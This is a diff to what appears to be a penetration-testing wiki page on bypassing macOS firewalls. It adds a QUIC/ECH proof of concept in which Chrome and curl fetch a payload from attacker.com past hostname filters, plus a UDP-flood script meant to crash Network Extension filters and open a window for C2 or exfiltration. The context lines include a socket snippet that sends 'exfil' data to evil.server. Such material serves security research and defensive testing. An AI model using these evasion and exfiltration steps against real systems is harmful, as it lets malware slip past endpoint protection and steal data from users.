@@ -121,6 +121,41 @@ s = socket.create_connection(("evil.server", 443))
 s.send(b"exfil...")
 ```
 
+### QUIC/ECH to evade Network Extension domain filters (macOS 12+)
+NEFilter Packet/Data Providers key off the TLS ClientHello SNI/ALPN. With **HTTP/3 over QUIC (UDP/443)** and **Encrypted Client Hello (ECH)** the SNI stays encrypted, NetExt cannot parse the flow, and hostname rules often fail-open, letting malware reach blocked domains without touching DNS.
+
+Minimal PoC:
+
+```bash
+# Chrome/Edge – force HTTP/3 and ECH
+/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
+  --enable-quic --origin-to-force-quic-on=attacker.com:443 \
+  --enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
+  https://attacker.com/payload
+
+# cURL 8.10+ built with quiche
+curl --http3-only https://attacker.com/payload
+```
+
+If QUIC/ECH is still enabled this is an easy hostname-filter evasion path.
+
+### macOS 15 “Sequoia” Network Extension instability (2024–2025)
+Early 15.0/15.1 builds crash third‑party **Network Extension** filters (LuLu, Little Snitch, Defender, SentinelOne, etc.). When the filter restarts macOS drops its flow rules and many products fail‑open. Flooding the filter with thousands of short UDP flows (or forcing QUIC/ECH) can repeatedly trigger the crash and leave a window for C2/exfil while the GUI still claims the firewall is running.
+
+Quick reproduction (safe lab box):
+
+```bash
+# create many short UDP flows to exhaust NE filter queues
+python3 - <<'PY'
+import socket, os
+for i in range(5000):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.sendto(b'X'*32, ('1.1.1.1', 53))
+PY
+# watch for NetExt crash / reconnect loop
+log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
+```
+
 ---
 
 ## Tooling tips for modern macOS
@@ -142,5 +177,7 @@ s.send(b"exfil...")
 - [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
 - <https://nosebeard.co/advisories/nbl-001.html>
 - <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>
+- <https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/>
+- <https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos>
 
 {{#include ../../banners/hacktricks-training.md}}
